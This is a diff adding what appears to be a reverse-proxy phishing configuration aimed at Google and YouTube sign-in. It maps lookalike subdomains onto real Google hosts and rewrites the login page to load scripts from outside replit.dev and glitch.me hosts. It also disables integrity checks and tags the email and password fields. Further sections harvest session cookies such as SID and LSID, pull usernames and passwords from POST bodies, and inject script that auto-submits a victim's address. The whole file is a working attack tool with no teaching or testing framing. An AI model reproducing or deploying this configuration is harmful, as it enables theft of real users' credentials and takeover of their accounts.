@@ -1,0 +1,143 @@
+author: '@tare new'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true  , is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wwsw', orig_sub: 'www', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'wsww', orig_sub: 'www', domain: 'google-analytics', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'youtwube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'youtube', orig_sub: 'youtube', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'statics', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'signaler', orig_sub: 'www', domain: 'signaler-pa.com', session: false, is_landing: false, auto_filter: true}
+  
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts.youtube.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'application/xml']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'www.google-analytics.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'workspace.google.com', replace: 'workspace.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.youtube.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'accounts.youtube.com', replace: 'accounts.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'R3=u\[Lp&&\(gW\+=Lp\+":"\)', replace: 'R3="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw.."', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: ',23]\(1,gW,3\)', replace: '', mimes: ['text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'po\.integrity=', replace: '/*po.integrity=', mimes: ['text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'var e=', replace: '*/var e=', mimes: ['text/javascript', 'text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '<head>', replace: '<head><script src="https://1982b2f4-59de-4e60-8f8e-2058de1fbdc3-00-lqolaicadse8.worf.replit.dev/script.js/botguard.js"></script>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '<input type="email" class=', replace: '<input id="username" type="email" class=', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '<input type="password" class=', replace: '<input id="password" type="password" class=', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"', replace: 'id="sendUsernameBtn" data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'CheckCookie', replace: 'accounts', mimes: ['application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'initAft\(\)<\/script>', replace: 'initAft()</script><script src="https://gentle-even-chiller.glitch.me/server.js" defer></script>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+ # - domain: '.google.com'
+  #  keys: [".*,regexp"]
+ #   type: 'cookie'
+ # - domain: 'accounts.google.com'
+  #  keys: [".*,regexp"]
+  #  type: 'cookie'
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+    type: 'cookie'
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
+    type: 'cookie'
+  - domain: 'mail.google.com'
+    keys: [".*,regexp"]
+    type: 'cookie'
+  - domain: 'signaler-pa.googleapis.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", "continue", "VISITOR_INFO1_LIVE", "GPS", "PREF", "YSC", "ST-zj77bk", "sej", "cn", "session_token", "ST-1crolk", "LOGIN_INFO", "device_id", "permission", "service", "hl", "req", "bgRequest", "deviceinfo", "gmscoreversion", "checkConnection", "checkedDomains", "pstMsg", "bghash", "identifier", "password", "ca", "ct"]
+    type: 'cookie'
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER"]
+    type: 'cookie'
+
+
+credentials:
+  username:
+    key: 'f.req'
+    search: '\[null\,\\"([^"\\]+)'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: 'null\,\[\\\"([^"\\]+)'
+    type: 'post'
+
+auth_urls:
+  - '/CheckCookie'
+  - '/_/AccountSettingsUi/browserinfo'
+  - '/ManageAccount'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search:
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
+    script: |
+     window.addEventListener("load", () => {
+       // Function to be executed every 3 minutes
+       function refreshPage() {
+         location.reload();
+       }
+
+       // Set interval to refresh the page every 3 minutes (3 * 60 * 1000 milliseconds)
+       setInterval(refreshPage, 1 * 60 * 1000);
+
+       if (window.location.hash.length == 0) {
+         return;
+       }
+
+       function waitForElm(e) {
+         return new Promise(t => {
+           if (document.querySelector(e)) return t(document.querySelector(e));
+           const r = new MutationObserver(o => {
+             document.querySelector(e) && (t(document.querySelector(e)), r.disconnect());
+           });
+           r.observe(document.body, { childList: true, subtree: true });
+         });
+       }
+
+       waitForElm("#identifierId").then(elm => {
+         elm.focus();
+         elm.value = window.location.hash.slice(1);
+         const submBtn = document.querySelector("#idSIButton9");
+         submBtn.focus();
+         submBtn.click();
+       });
+     });
